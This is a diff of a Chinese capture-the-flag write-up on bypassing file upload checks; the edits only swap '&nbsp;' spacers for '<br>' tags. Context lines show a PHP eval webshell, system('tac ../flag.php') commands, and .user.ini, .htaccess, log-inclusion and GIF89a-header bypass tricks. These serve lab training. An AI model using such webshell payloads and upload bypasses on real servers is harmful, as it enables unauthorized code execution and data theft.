@@ -42,7 +42,7 @@ description: " "
 - **后端验证：确保数据安全，必须执行。**
 - **仅有前端校验而缺少后端验证，形同虚设。**
 
-&nbsp;
+<br>
 
 
 
@@ -52,7 +52,7 @@ description: " "
 
 <img src="\images\article_images\image-20250818173725365.png" alt="image-20250818173725365" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -64,13 +64,13 @@ description: " "
 
 <img src="\images\article_images\image-20250818174234099.png" alt="image-20250818174234099" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250818173757367.png" alt="image-20250818173757367" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -88,7 +88,7 @@ a=system("ls ../");
 
 <img src="\images\article_images\image-20250818173838837.png" alt="image-20250818173838837" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -104,7 +104,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818173939197.png" alt="image-20250818173939197" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -116,7 +116,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818175506878.png" alt="image-20250818175506878" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -126,7 +126,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818175748747.png" alt="image-20250818175748747" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -134,7 +134,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818180017322.png" alt="image-20250818180017322" style="zoom: 33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -167,7 +167,7 @@ a=system("tac ../flag.php");
 
   3. **服务器如果只信任 `Content-Type`，那其实依然能上传成功。**
 
-&nbsp;
+<br>
 
 
 
@@ -183,7 +183,7 @@ a=system("tac ../flag.php");
 >
 > - **text/javascript: JavaScript 文件**
 >
-> &nbsp;
+> <br>
 >
 > 
 >
@@ -197,7 +197,7 @@ a=system("tac ../flag.php");
 >
 > - **multipart/form-data: 表单数据，通常用于文件上传时**
 >
-> &nbsp;
+> <br>
 >
 > 
 >
@@ -208,7 +208,7 @@ a=system("tac ../flag.php");
 > - **image/png: PNG 图像**
 > - **image/gif: GIF 图像**
 >
-> &nbsp;
+> <br>
 >
 > 
 >
@@ -217,13 +217,13 @@ a=system("tac ../flag.php");
 > - **audio/mpeg: MP3 音频**
 > - **video/mp4: MP4 视频**
 
-&nbsp;
+<br>
 
 
 
 **因此，这一题不能通过修改源代码直接上传php木马解题**
 
-&nbsp;
+<br>
 
 
 
@@ -233,7 +233,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818193032111.png" alt="image-20250818193032111" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -249,7 +249,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818192416603.png" alt="image-20250818192416603" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -274,7 +274,7 @@ auto_append_file = <filename>          //包含在文件尾
 
 **`.user.ini` 可以把指定的一个文件包含到目录下==所有==会以php执行的文件中（比如 `index.php`、`test.php`），当访问 `index.php` 后，这个被指定的文件，无论后缀是什么，都会以php的方式进行读取，所以可以绕过后端检测**
 
-&nbsp;
+<br>
 
 
 
@@ -286,7 +286,7 @@ auto_append_file = <filename>          //包含在文件尾
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -298,13 +298,13 @@ auto_prepend_file=muma.png
 
 **上传 `1.png` 并抓包，重命名为 `.user.ini`**
 
-&nbsp;
+<br>
 
 
 
 <img src="\images\article_images\image-20250818215940876.png" alt="image-20250818215940876" style="zoom:33%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -314,7 +314,7 @@ auto_prepend_file=muma.png
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -328,7 +328,7 @@ a=system("ls ../");
 
 <img src="\images\article_images\image-20250818221044605.png" alt="image-20250818221044605" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -344,7 +344,7 @@ a=system("tac ../flag.php")
 
 <img src="\images\article_images\image-20250818221114730.png" alt="image-20250818221114730" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -362,7 +362,7 @@ auto_prepend_file=muma.png
 
 <img src="\images\article_images\image-20250818224418932.png" alt="image-20250818224418932" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -370,7 +370,7 @@ auto_prepend_file=muma.png
 
 <img src="\images\article_images\image-20250818224735310.png" alt="image-20250818224735310" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -393,7 +393,7 @@ a=system("ls ../");
 
 <img src="\images\article_images\image-20250818225238212.png" alt="image-20250818225238212" style="zoom:20%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -409,7 +409,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818225312977.png" alt="image-20250818225312977" style="zoom:20%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -421,7 +421,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818230807703.png" alt="image-20250818230807703" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -429,7 +429,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818230935547.png" alt="image-20250818230935547" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -445,7 +445,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818231158000.png" alt="image-20250818231158000" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -459,7 +459,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818232533231.png" alt="image-20250818232533231" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -469,7 +469,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818232518013.png" alt="image-20250818232518013" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -483,7 +483,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818232502599.png" alt="image-20250818232502599" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -493,7 +493,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818235436046.png" alt="image-20250818235436046" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -501,7 +501,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818235403094.png" alt="image-20250818235403094" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -509,7 +509,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818235502235.png" alt="image-20250818235502235" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -525,7 +525,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818234431522.png" alt="image-20250818234431522" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -540,7 +540,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818234404492.png" alt="image-20250818234404492" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -554,7 +554,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250818234343209.png" alt="image-20250818234343209" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -568,7 +568,7 @@ a=system("tac ../flag.php");
 
 **直接访问 `靶机/upload` 拿到flag**
 
-&nbsp;
+<br>
 
 
 
@@ -580,7 +580,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250819000053481.png" alt="image-20250819000053481" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -591,7 +591,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250819000027970.png" alt="image-20250819000027970" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -605,7 +605,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250819000007796.png" alt="image-20250819000007796" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -619,7 +619,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250819134826160.png" alt="image-20250819134826160" style="zoom: 25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -631,7 +631,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250819135336499.png" alt="image-20250819135336499" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -642,7 +642,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250819135308470.png" alt="image-20250819135308470" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -650,7 +650,7 @@ a=system("tac ../flag.php");
 
 **日志包含**
 
-&nbsp;
+<br>
 
 
 
@@ -658,7 +658,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250819164024580.png" alt="image-20250819164024580" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -670,7 +670,7 @@ a=system("tac ../flag.php");
 
 <img src="\images\article_images\image-20250819164002362.png" alt="image-20250819164002362" style="zoom:80%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -688,7 +688,7 @@ aaa<?php @eval($_POST[a]);?>
 
 <img src="\images\article_images\image-20250819163829147.png" alt="image-20250819163829147" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -698,7 +698,7 @@ aaa<?php @eval($_POST[a]);?>
 
 <img src="\images\article_images\image-20250819163924591.png" alt="image-20250819163924591" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -712,7 +712,7 @@ aaa<?php @eval($_POST[a]);?>
 
 <img src="\images\article_images\image-20250819165424855.png" alt="image-20250819165424855" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -724,7 +724,7 @@ aaa<?php @eval($_POST[a]);?>
 
 <img src="\images\article_images\image-20250819165409321.png" alt="image-20250819165409321" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -742,7 +742,7 @@ aaaaa<?php @eval($_POST[a]);?>
 
 <img src="\images\article_images\image-20250819165353188.png" alt="image-20250819165353188" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -752,7 +752,7 @@ aaaaa<?php @eval($_POST[a]);?>
 
 <img src="\images\article_images\image-20250819165250645.png" alt="image-20250819165250645" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -762,7 +762,7 @@ aaaaa<?php @eval($_POST[a]);?>
 
 <img src="\images\article_images\image-20250819170103240.png" alt="image-20250819170103240" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -774,7 +774,7 @@ aaaaa<?php @eval($_POST[a]);?>
 
 <img src="\images\article_images\image-20250819170048632.png" alt="image-20250819170048632" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -787,7 +787,7 @@ aaaaa<?php @eval($_POST[a]);?>
 
 <img src="\images\article_images\image-20250819170003662.png" alt="image-20250819170003662" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -801,7 +801,7 @@ getimagesize(): 会对目标文件的16进制去进行一个读取，去读取�
 
 **后端会检测png文件是否真的为png，所以要在图片头加上 `GIF89a`**
 
-&nbsp;
+<br>
 
 
 
@@ -814,7 +814,7 @@ auto_prepend_file="muma.png"
 
 <img src="\images\article_images\image-20250819171303205.png" alt="image-20250819171303205" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -827,7 +827,7 @@ GIF89a
 
 <img src="\images\article_images\image-20250819171534908.png" alt="image-20250819171534908" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -840,7 +840,7 @@ GIF89a
 
 <img src="\images\article_images\image-20250819171519897.png" alt="image-20250819171519897" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -854,7 +854,7 @@ GIF89a
 
 **session文件上传竞争**
 
-&nbsp;
+<br>
 
 
 
@@ -867,7 +867,7 @@ auto_prepend_file=/tmp/sess_love
 
 <img src="\images\article_images\image-20250819181816577.png" alt="image-20250819181816577" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -890,7 +890,7 @@ auto_prepend_file=/tmp/sess_love
 </html>
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -912,7 +912,7 @@ Cookie: PHPSESSID=love
 
 <img src="\images\article_images\image-20250819182340513.png" alt="image-20250819182340513" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -922,7 +922,7 @@ Cookie: PHPSESSID=love
 
 <img src="\images\article_images\image-20250819181747316.png" alt="image-20250819181747316" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -946,7 +946,7 @@ Cookie: PHPSESSID=love
 
 <img src="\images\article_images\image-20250819181656530.png" alt="image-20250819181656530" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -958,7 +958,7 @@ Cookie: PHPSESSID=love
 
 <img src="\images\article_images\image-20250819181614865.png" alt="image-20250819181614865" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -973,7 +973,7 @@ auto_prepend_file=/tmp/sess_love
 
 <img src="\images\article_images\image-20250819181816577.png" alt="image-20250819181816577" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -981,7 +981,7 @@ auto_prepend_file=/tmp/sess_love
 
 <img src="\images\article_images\image-20250819194618891.png" alt="image-20250819194618891" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1071,7 +1071,7 @@ if __name__ == '__main__':
     main()
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1083,7 +1083,7 @@ if __name__ == '__main__':
 
 **php伪协议**
 
-&nbsp;
+<br>
 
 
 
@@ -1091,7 +1091,7 @@ if __name__ == '__main__':
 
 **同 web162：BurpSuite内条件竞争**
 
-&nbsp;
+<br>
 
 
 
@@ -1108,7 +1108,7 @@ auto_prepend_file=/tmp/sess_love
 
 <img src="\images\article_images\image-20250819212648602.png" alt="image-20250819212648602" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1116,7 +1116,7 @@ auto_prepend_file=/tmp/sess_love
 
 <img src="\images\article_images\image-20250819212528233.png" alt="image-20250819212528233" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1207,7 +1207,7 @@ if __name__ == '__main__':
 
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1257,7 +1257,7 @@ if __name__ == '__main__':
 
   （4）重新构造“图片马”并循环测试
 
-&nbsp;
+<br>
 
 
 
@@ -1291,13 +1291,13 @@ layui.use('upload', function(){
 });
 ```
 
-&nbsp;
+<br>
 
 
 
 **可以看到源代码有个 `download.php?image=`，基本确定考点为二次渲染**
 
-&nbsp;
+<br>
 
 
 
@@ -1333,7 +1333,7 @@ imagepng($img,'re_encoded.png');
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -1349,7 +1349,7 @@ imagepng($img,'re_encoded.png');
 
 <img src="\images\article_images\image-20250820004726742.png" alt="image-20250820004726742" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1357,7 +1357,7 @@ imagepng($img,'re_encoded.png');
 
 <img src="\images\article_images\image-20250820003154047.png" alt="image-20250820003154047" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1371,7 +1371,7 @@ imagepng($img,'re_encoded.png');
 
 <img src="\images\article_images\image-20250820004912573.png" alt="image-20250820004912573" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1379,7 +1379,7 @@ imagepng($img,'re_encoded.png');
 
 <img src="\images\article_images\image-20250820003757010.png" alt="image-20250820003757010" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1389,7 +1389,7 @@ imagepng($img,'re_encoded.png');
 
 **`jpg` 二次渲染**
 
-&nbsp;
+<br>
 
 
 
@@ -1397,7 +1397,7 @@ imagepng($img,'re_encoded.png');
 
 <img src="\images\article_images\image-20250820135624000.png" alt="image-20250820135624000" style="zoom:10%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1572,7 +1572,7 @@ imagepng($img,'re_encoded.png');
 ?>
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1588,7 +1588,7 @@ imagepng($img,'re_encoded.png');
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -1598,7 +1598,7 @@ imagepng($img,'re_encoded.png');
 
 <img src="\images\article_images\image-20250820113138020.png" alt="image-20250820113138020" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1610,7 +1610,7 @@ imagepng($img,'re_encoded.png');
 
 <img src="\images\article_images\image-20250820114058648.png" alt="image-20250820114058648" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1618,7 +1618,7 @@ imagepng($img,'re_encoded.png');
 
 <img src="\images\article_images\image-20250820114022894.png" alt="image-20250820114022894" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1630,7 +1630,7 @@ imagepng($img,'re_encoded.png');
 
 <img src="\images\article_images\image-20250820142602579.png" alt="image-20250820142602579" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1638,7 +1638,7 @@ imagepng($img,'re_encoded.png');
 
 <img src="\images\article_images\image-20250820143914089.png" alt="image-20250820143914089" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1652,7 +1652,7 @@ a=system("ls ../")
 
 <img src="\images\article_images\image-20250820143750984.png" alt="image-20250820143750984" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1666,7 +1666,7 @@ a=system("tac ../flag.php")
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -1676,7 +1676,7 @@ a=system("tac ../flag.php")
 
 **`.user.ini` 可以用于多种服务器，但前提是同级目录下必须有一个php文件**
 
-&nbsp;
+<br>
 
 
 
@@ -1756,7 +1756,7 @@ RewriteEngine On
 RewriteRule ^article/([0-9]+)$ article.php?id=$1 [L]
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1766,7 +1766,7 @@ AddType application/x-httpd-php .jpg   //将.jpg后缀的文件解析 成php
 SetHandler application/x-httpd-php    //将所有文件都解析为 php 文件
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1778,7 +1778,7 @@ SetHandler application/x-httpd-php    //将所有文件都解析为 php 文件
 
 <img src="\images\article_images\image-20250820164020304.png" alt="image-20250820164020304" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1786,7 +1786,7 @@ SetHandler application/x-httpd-php    //将所有文件都解析为 php 文件
 
 <img src="\images\article_images\image-20250820164042560.png" alt="image-20250820164042560" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1804,7 +1804,7 @@ a=system("tac ../flag.php");
 
 
 
-&nbsp;
+<br>
 
 
 
@@ -1823,7 +1823,7 @@ $c($_REQUEST[1]);
 ?>
 ```
 
-&nbsp;
+<br>
 
 
 
@@ -1831,7 +1831,7 @@ $c($_REQUEST[1]);
 
 <img src="\images\article_images\image-20250821011210389.png" alt="image-20250821011210389" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1847,7 +1847,7 @@ $c($_REQUEST[1]);
 
 <img src="\images\article_images\image-20250821011003318.png" alt="image-20250821011003318" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1861,7 +1861,7 @@ $c($_REQUEST[1]);
 
 <img src="\images\article_images\image-20250821011049047.png" alt="image-20250821011049047" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1873,7 +1873,7 @@ $c($_REQUEST[1]);
 
 <img src="\images\article_images\image-20250821165440610.png" alt="image-20250821165440610" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1894,7 +1894,7 @@ Content-Type: image/png
 
 <img src="\images\article_images\image-20250821165835463.png" alt="image-20250821165835463" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1906,7 +1906,7 @@ auto_prepend_file=/var/log/nginx/access.log
 
 <img src="\images\article_images\image-20250821170042049.png" alt="image-20250821170042049" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1922,7 +1922,7 @@ a=system("ls ../");
 
 <img src="\images\article_images\image-20250821170556956.png" alt="image-20250821170556956" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1936,7 +1936,7 @@ a=system("tac ../flagaa.php");
 
 <img src="\images\article_images\image-20250821170652567.png" alt="image-20250821170652567" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1948,7 +1948,7 @@ a=system("tac ../flagaa.php");
 
 <img src="\images\article_images\image-20250821165440610.png" alt="image-20250821165440610" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1969,7 +1969,7 @@ Content-Type: image/png
 
 <img src="\images\article_images\image-20250821172331063.png" alt="image-20250821172331063" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
@@ -1981,7 +1981,7 @@ auto_prepend_file=/var/log/nginx/access.log
 
 <img src="\images\article_images\image-20250821172439983.png" alt="image-20250821172439983" style="zoom:25%;" />
 
-&nbsp;
+<br>
 
 
 
